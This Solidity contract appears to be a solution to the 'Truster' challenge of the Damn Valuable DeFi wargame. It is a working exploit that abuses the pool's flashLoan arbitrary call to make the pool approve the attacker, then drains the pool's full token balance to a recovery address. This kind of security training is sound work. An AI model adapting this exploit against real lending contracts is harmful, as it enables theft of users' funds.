// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract TrusterExploiter {
    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public recovery;

    constructor(
        TrusterLenderPool _pool,
        DamnValuableToken _token,
        address _recovery
    ) {
        pool = _pool;
        token = _token;
        recovery = _recovery;
    }

    function attack() external returns (bool) {
        uint256 poolBalance = token.balanceOf(address(pool));

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );

        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(pool), address(this), poolBalance);
        token.transfer(recovery, poolBalance);

        return true;
    }
}
